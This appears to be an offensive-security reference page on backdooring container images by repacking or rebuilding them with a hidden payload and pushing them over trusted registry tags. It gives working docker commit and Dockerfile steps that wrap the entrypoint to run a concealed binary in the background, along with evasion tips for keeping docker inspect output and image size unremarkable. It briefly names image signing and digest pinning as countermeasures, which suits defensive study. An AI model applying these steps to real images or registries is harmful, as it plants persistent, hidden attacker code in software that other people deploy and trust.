---
title: "Image backdooring: modifying an image to run attacker code on launch"
description: "An attacker with write access to an image or its registry tag rebuilds or repacks it to add a persistent payload: an altered entrypoint that launches a backdoor alongside the real process, an injected layer, or modified binaries. Every container started from the backdoored image runs the attacker's code, usually without visibly changing the application's behaviour."
keywords:
  - image backdoor
  - entrypoint
  - layer injection
  - docker commit
  - supply chain
---

# Image backdooring

Backdooring an image makes every container launched from it run attacker code. Unlike base image poisoning, which targets an upstream to reach many downstreams, this modifies a specific image an attacker can rewrite, whether a widely pulled application image or one they will push over a trusted tag. The craft is to add the payload without breaking the application, so the backdoor survives review and normal use.

## Adding the payload

```bash
# 1. Repack an existing image: run it, add the payload, commit a new image
docker run --name t <image> sleep 1
docker cp agent t:/usr/local/bin/.a
docker commit --change 'ENTRYPOINT ["/bin/sh","-c","/usr/local/bin/.a & exec \"$@\"","--"]' \
  t <registry>/<image>:<tag>
docker push <registry>/<image>:<tag>
```

```dockerfile
# 2. Rebuild from a Dockerfile with an entrypoint wrapper and an injected layer
FROM <image>
COPY agent /usr/local/bin/.a
RUN chmod +x /usr/local/bin/.a
ENTRYPOINT ["/bin/sh","-c","/usr/local/bin/.a & exec \"$@\"","--"]
```

The wrapper launches the payload in the background and then `exec`s the original command, so the container's visible behaviour is unchanged while the backdoor runs.

## Staying hidden

```bash
# match the original entrypoint/cmd so docker inspect looks normal
docker inspect <orig> | jq '.[0].Config.Entrypoint, .[0].Config.Cmd'
# name the payload to blend in and avoid new exposed ports
# keep the image size plausible; a huge new layer is a tell
```

## Exploitation notes

- Preserving the original entrypoint and command behind the wrapper is what keeps the backdoor from breaking the app and from standing out in `docker inspect`.
- Pushing over an existing trusted tag (`<image>:<tag>`) is the delivery; combine with [Unauthenticated registry access](unauthenticated-registry-access.md) or [Registry access](registry-access.md) for the write.
- A persistent outbound agent is more reliable than an exposed listener, since container networks and firewalls often block inbound connections but allow egress.
- Image signing and digest pinning (Docker Content Trust, cosign) break this when enforced downstream; unsigned tags pulled by name are the exposed case.

## References

- [Docker: commit and content trust](https://docs.docker.com/reference/cli/docker/image/commit/)
- [Sigstore cosign: image signing](https://docs.sigstore.dev/cosign/overview/)
- [SLSA: supply-chain threats](https://slsa.dev/spec/v1.0/threats)
